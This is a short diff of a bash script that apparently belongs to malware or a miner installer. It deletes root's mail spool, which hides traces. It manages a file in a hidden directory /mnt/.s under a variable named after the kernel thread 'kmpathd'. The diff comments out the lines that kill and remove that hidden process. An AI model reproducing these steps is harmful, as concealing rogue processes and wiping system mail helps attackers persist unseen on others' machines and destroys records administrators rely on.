@@ -1,7 +1,7 @@
 #!/bin/bash
 rm /var/spool/mail/root 
-pkill -f '/mnt/.s/xxl_job'
-rm  -rf /mnt/.s/xxl_job
+#pkill -f '/mnt/.s/xxl_job'
+#rm  -rf /mnt/.s/xxl_job
 # 设置变量以提高可读性
 OPT_S_DIR="/mnt/.s"
 KMPATHD_FILE="$OPT_S_DIR/xxl_job"
